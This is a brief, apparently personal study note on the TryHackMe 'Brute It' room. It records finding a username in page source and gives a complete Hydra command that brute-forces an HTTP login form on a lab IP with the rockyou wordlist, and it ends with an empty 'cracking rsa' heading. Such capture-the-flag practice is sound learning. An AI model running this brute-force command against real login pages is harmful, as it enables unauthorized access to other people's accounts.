
2024-07-28 20:06

Source: #tryhackme 

Tags:  [[Cryptography]]

#### Hydra brute force

we have a website that has a simple login page with username and password 
we find the username from the source code 
use [[hydra]] to brute force the password
```
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.91.80 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
```
#### cracking rsa 


### References
[TryHackMe | Brute It](https://tryhackme.com/r/room/bruteit)